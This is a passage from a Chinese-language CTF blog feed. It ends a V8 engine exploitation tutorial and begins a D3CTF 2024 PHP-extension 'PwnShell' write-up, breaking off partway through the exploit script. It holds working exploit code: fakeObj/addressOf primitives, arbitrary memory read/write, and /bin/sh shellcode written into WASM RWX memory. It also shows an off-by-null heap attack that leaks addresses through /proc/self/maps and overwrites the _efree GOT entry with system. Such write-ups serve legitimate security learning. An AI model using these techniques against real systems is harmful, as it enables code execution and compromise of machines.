class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> object_array_map = object_array.<span class="title function_">oob</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] float array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(float_array_map)));</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(object_array_map)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    float_array[<span class="number">0</span>] = obj;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(float_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeObj</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    object_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr | <span class="number">1n</span>);</span><br><span class="line">    object_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    <span class="keyword">return</span> object_array[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ab1 = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">var</span> ab2 = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">var</span> dv1 = <span class="keyword">new</span> <span class="title class_">DataView</span>(ab1);</span><br><span class="line"><span class="keyword">var</span> dv2 = <span class="keyword">new</span> <span class="title class_">DataView</span>(ab2);</span><br><span class="line"><span class="keyword">var</span> ab1_bs_addr = <span class="title function_">addressOf</span>(ab1) + <span class="number">0x20n</span>;</span><br><span class="line"><span class="keyword">var</span> ab2_bs_addr = <span class="title function_">addressOf</span>(ab2) + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> float_array_mem = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    <span class="number">0</span>,  <span class="comment">// 没有原型</span></span><br><span class="line">    <span class="title function_">u2d</span>(ab1_bs_addr - <span class="number">0x10n</span>),  <span class="comment">// fake elements ptr</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0x100000000n</span>),  <span class="comment">// fake length</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">fake_float_array = <span class="title function_">fakeObj</span>(<span class="title function_">addressOf</span>(float_array_mem) + <span class="number">0x30n</span>);</span><br><span class="line">fake_float_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(ab2_bs_addr - <span class="number">1n</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_read</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    dv1.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, address, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv2.<span class="title function_">getBigUint64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_write</span>(<span class="params">address, value</span>) &#123;</span><br><span class="line">    dv1.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, address, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv2.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code));</span><br><span class="line"><span class="keyword">let</span> f = wasm_mod.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_mem_addr = <span class="title function_">arbitrary_address_read</span>(<span class="title function_">addressOf</span>(wasm_mod) - <span class="number">1n</span> + <span class="number">0x88n</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] rwx mem addr: &quot;</span> + <span class="title function_">hex</span>(rwx_mem_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0x2fbb485299583b6an</span>,</span><br><span class="line">    <span class="number">0x5368732f6e69622fn</span>,</span><br><span class="line">    <span class="number">0x050f5e5457525f54n</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">arbitrary_address_write</span>(rwx_mem_addr + <span class="title class_">BigInt</span>(i) * <span class="number">8n</span>, shellcode[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>十分简单的入门了一下 <code>v8</code> 漏洞利用，该类漏洞以及利用方式还有很多，看来有的学了<br>今天 <code>Csome</code> 学长在 <code>defcon</code> 拿了一血，太牛拉  </p><img src="/2024/05/05/v8start/10.png" class="" title="我的图图呢">  <p>哎，我也想成为像他那么强，还有很长的路要走啊。md，不说那么多了，开卷！！！<br>参考：<br><a href="https://www.anquanke.com/post/id/267518">https://www.anquanke.com/post/id/267518</a><br><a href="https://blog.csdn.net/qq_45323960/article/details/130124693">https://blog.csdn.net/qq_45323960/article/details/130124693</a><br><a href="https://blog.csdn.net/weixin_46483787/article/details/134934993">https://blog.csdn.net/weixin_46483787/article/details/134934993</a><br><a href="https://ponyfoo.com/articles/an-introduction-to-speculative-optimization-in-v8">https://ponyfoo.com/articles/an-introduction-to-speculative-optimization-in-v8</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>D3CTF 2024</title>
      <link href="/2024/04/29/d3ctf2024/"/>
      <url>/2024/04/29/d3ctf2024/</url>
      
        <content type="html"><![CDATA[<h1 id="PwnShell"><a href="#PwnShell" class="headerlink" title="PwnShell"></a>PwnShell</h1><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>很久以前就听说过 <code>php pwn</code>，没想到就在这里遇到了。出题人自己实现了一个 <code>php</code> 扩展模块 <code>vuln.so</code>，很显然漏洞就来源于这里，通过逆向分析发现出题人在这个模块中实现的菜单堆，其漏洞函数如下：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">zif_addHacker</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *v7; <span class="comment">// r12</span></span><br><span class="line">  _QWORD *v8; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">void</span> *v9; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> v10; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *v11; <span class="comment">// rsi</span></span><br><span class="line">  _BYTE *v12; <span class="comment">// r13</span></span><br><span class="line">  __int64 v13; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *v14; <span class="comment">// [rsp+8h] [rbp-40h] BYREF</span></span><br><span class="line">  _BYTE *v15; <span class="comment">// [rsp+10h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp+18h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v3 = *(<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">44</span>);</span><br><span class="line">  v16 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)zend_parse_parameters(v3, &amp;unk_2000, &amp;v15, &amp;v14) != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v15[<span class="number">8</span>] == <span class="number">6</span> &amp;&amp; v14[<span class="number">8</span>] == <span class="number">6</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = <span class="number">0LL</span>;</span><br><span class="line">      v6 = &amp;chunkList[<span class="number">2</span>];</span><br><span class="line">      <span class="keyword">while</span> ( *v6 != <span class="number">1</span> )                        <span class="comment">// 寻找空闲堆块</span></span><br><span class="line">      &#123;</span><br><span class="line">        ++v5;</span><br><span class="line">        v6 += <span class="number">0x10</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v5 == <span class="number">0x10</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">      &#125;</span><br><span class="line">      v2 = v5;</span><br><span class="line">LABEL_9:</span><br><span class="line">      v7 = &amp;chunkList[<span class="number">4</span> * v2];</span><br><span class="line">      v8 = (_QWORD *)_emalloc(*(_QWORD *)(*(_QWORD *)v14 + <span class="number">0x10</span>LL) + <span class="number">0x10</span>LL);<span class="comment">// v14字符串长度+0x10</span></span><br><span class="line">      v9 = (<span class="type">void</span> *)_emalloc(*(_QWORD *)(*(_QWORD *)v15 + <span class="number">0x10</span>LL));<span class="comment">// v15字符串的长度</span></span><br><span class="line">      *v8 = v9;                                 <span class="comment">// 存v15的地址</span></span><br><span class="line">      v10 = *(_QWORD *)(*(_QWORD *)v15 + <span class="number">0x10</span>LL);<span class="comment">// v15字符串长度</span></span><br><span class="line">      v11 = (<span class="type">const</span> <span class="type">void</span> *)(*(_QWORD *)v15 + <span class="number">0x18</span>LL);<span class="comment">// v15字符串的起始地址</span></span><br><span class="line">      v8[<span class="number">1</span>] = v10;                              <span class="comment">// 存v15字符串的长度</span></span><br><span class="line">      <span class="built_in">memcpy</span>(v9, v11, v10);                     <span class="comment">// 复制v15字符串内容到v9中</span></span><br><span class="line">      v12 = v14;</span><br><span class="line">      <span class="built_in">memcpy</span>(v8 + <span class="number">2</span>, (<span class="type">const</span> <span class="type">void</span> *)(*(_QWORD *)v14 + <span class="number">0x18</span>LL), *(_QWORD *)(*(_QWORD *)v14 + <span class="number">0x10</span>LL));</span><br><span class="line">      v13 = *(_QWORD *)(*(_QWORD *)v12 + <span class="number">0x10</span>LL);<span class="comment">// 存v14字符串的长度</span></span><br><span class="line">      *(_QWORD *)v7 = v8;</span><br><span class="line">      v7[<span class="number">2</span>] = <span class="number">13</span>;</span><br><span class="line">      *((_BYTE *)v8 + v13 + <span class="number">0x10</span>) = <span class="number">0</span>;          <span class="comment">// 存在off by null</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(a2 + <span class="number">8</span>) = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v16 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里先对部分语句进行介绍，首先是下面这段代码：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v3 = *(<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">44</span>);</span><br></pre></td></tr></table></figure><p>其作用是获取函数的参数个数。接下来是 <code>zend_parse_parameters</code> 函数，其函数原型为：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">END_API <span class="type">int</span> <span class="title function_">zend_parse_parameters</span><span class="params">(<span class="type">int</span> num_args, <span class="type">const</span> <span class="type">char</span> *type_spec, ...)</span></span><br></pre></td></tr></table></figure><p>第一个参数是传递的参数个数。通常使用 <code>ZEND_NUM_ARGS()</code> 来获取。 第二个参数是一个字符串，指定了函数期望的各个参数的类型，后面紧跟着需要随参数值更新的变量列表。 因为 <code>php</code> 采用松散的变量定义和动态的类型判断，这样做就使得把不同类型的参数转化为期望的类型成为可能。<br>下表列出了可能指定的类型：  </p><table><thead><tr><th>类型指定符</th><th>对应的C类型</th><th>描述</th></tr></thead><tbody><tr><td>l</td><td>long</td><td>符号整数</td></tr><tr><td>d</td><td>double</td><td>浮点数</td></tr><tr><td>s</td><td>char *, int</td><td>二进制字符串，长度</td></tr><tr><td>b</td><td>zend_bool</td><td>逻辑型（1或0）</td></tr><tr><td>r</td><td>zval *</td><td>资源（文件指针，数据库连接等）</td></tr><tr><td>a</td><td>zval *</td><td>联合数组</td></tr><tr><td>o</td><td>zval *</td><td>任何类型的对象</td></tr><tr><td>O</td><td>zval *</td><td>指定类型的对象。需要提供目标对象的类类型</td></tr><tr><td>z</td><td>zval *</td><td>无任何操作的zval</td></tr></tbody></table><p>例如下面的例子：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zend_parse_parameters(ZEND_NUM_ARGS(), <span class="string">&quot;sl&quot;</span>, &amp;str, &amp;str_len, &amp;n)</span><br></pre></td></tr></table></figure><p>该表达式则是获取两个参数 <code>str</code> 和 <code>n</code>，字符串的类型是 <code>s</code>，需要两个参数 <code>char *</code> 字符串和 <code>int</code> 长度；数字的类型 <code>l</code> ，只需要一个参数。<br>现在重新回到题目的代码，可以看到存在一个 <code>off by null</code> 漏洞（注释里面有写），这里我们就要先认识一下 <code>php</code> 的堆结构。<code>php</code> 的堆结构类似于 <code>libc 2.27</code> 的 <code>tcache</code>， 在 <code>tcache</code> 的基础上删去了 <code>head</code> 头。由此可见，<code>php</code> 的堆还是挺好利用的。由于 <code>vuln.so</code> 模块的 <code>RELRO</code> 开启状态为 <code>Partial RELRO</code>，所以我们可以通过 <code>off by null</code> 漏洞和堆风水修改堆块的 <code>fd</code> 指针，实现修改 <code>_efree</code> 函数的 <code>got</code> 表为 <code>system，</code>从而实现任意指令的执行<br>接下来的问题是如何泄露地址，这里需要用到一个 <code>linux</code> 的知识。<code>linux</code> 系统内核提供了一种通过 <code>/proc</code> 的文件系统，在程序运行时访问内核数据，改变内核设置的机制。<code>/proc</code> 是一种伪文件结构，也就是说是仅存在于内存中。<code>/proc</code> 中一般比较重要的目录是 <code>sys</code>、<code>net</code> 和 <code>scsi</code>，<code>sys</code> 目录是可写的，可以通过它来访问和修改内核的参数 <code>/proc</code> 中有一些以 <code>PID</code> 命名（进程号）的进程目录，可以读取对应进程的信息，另外还有一个 <code>/self</code> 目录，用于记录本进程的信息。也即可以通过 <code>/proc/$PID/</code> 目录来获得该进程的信息，但是这个方法需要知道进程的 <code>PID</code> 是多少，在 <code>fork</code>、<code>daemon</code> 等情况下，<code>PID</code> 可能还会发生变化。所以 <code>Linux</code> 提供了 <code>self</code> 目录，来解决这个问题，不过不同的进程来访问这个目录获得的信息是不同的，内容等价于 <code>/proc/</code> 本进程  <code>PID</code> 目录下的内容。所以可以通过 <code>self</code> 目录直接获得自身的信息，不需要知道 <code>PID</code>。<br>那么，我们这里只需要读取 <code>/proc/self/maps</code> 文件即可。然后，在输出中得到 <code>libc</code> 地址和 <code>vuln.so</code> 的地址。<br>这里，还需要用到 <code>php</code> 的一个技巧，即 <code>ob</code> 函数。在 <code>php</code> 中我们可以通过 <code>ob_start</code> 来打开缓冲区，然后程序的输出流就会被存储到变量中，我们可以使用 <code>ob_get_contents</code> 来获得 输出流，然后通过正则匹配从输出流中获得地址。<br>这部分可以当作板子来用，就像这一道题目用于泄露地址的代码为：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leakaddr</span>(<span class="params"><span class="variable">$buffer</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$libc</span>,<span class="variable">$mbase</span>;</span><br><span class="line">    <span class="variable">$p</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc.so.6/&#x27;</span>;</span><br><span class="line">    <span class="variable">$p1</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20230831\/vuln.so/&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p</span>, <span class="variable">$buffer</span>, <span class="variable">$libc</span>);</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p1</span>, <span class="variable">$buffer</span>, <span class="variable">$mbase</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$libc</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$mbase</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(<span class="string">&quot;leakaddr&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line"><span class="variable">$buffer</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="title function_ invoke__">leakaddr</span>(<span class="variable">$buffer</span>);</span><br><span class="line"><span class="variable">$libc_base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$libc</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"><span class="variable">$mod_base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$mbase</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><p>exp：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str2Hex</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$hex</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>) - <span class="number">1</span>;<span class="variable">$i</span> &gt;= <span class="number">0</span>;<span class="variable">$i</span>--) <span class="variable">$hex</span>.= <span class="title function_ invoke__">dechex</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$i</span>]));</span><br><span class="line">    <span class="variable">$hex</span> = <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$hex</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$hex</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">int2Str</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$x</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="variable">$x</span>; <span class="variable">$j</span>++) &#123;</span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">pack</span>(<span class="string">&#x27;C&#x27;</span>, <span class="variable">$i</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$i</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leakaddr</span>(<span class="params"><span class="variable">$buffer</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$libc</span>,<span class="variable">$mbase</span>;</span><br><span class="line">    <span class="variable">$p</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc.so.6/&#x27;</span>;</span><br><span class="line">    <span class="variable">$p1</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20230831\/vuln.so/&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p</span>, <span class="variable">$buffer</span>, <span class="variable">$libc</span>);</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p1</span>, <span class="variable">$buffer</span>, <span class="variable">$mbase</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$libc</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$mbase</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(<span class="string">&quot;leakaddr&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line"><span class="variable">$buffer</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="title function_ invoke__">leakaddr</span>(<span class="variable">$buffer</span>);</span><br><span class="line"><span class="variable">$libc_base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$libc</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"><span class="variable">$mod_base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$mbase</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system_addr</span> = <span class="number">0x4c490</span>;</span><br><span class="line"><span class="variable">$efree_got</span> = <span class="number">0x4038</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;a&quot;</span>, <span class="number">0x40</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;b&quot;</span>, <span class="number">0x3f</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt; <span class="number">0xe</span>; <span 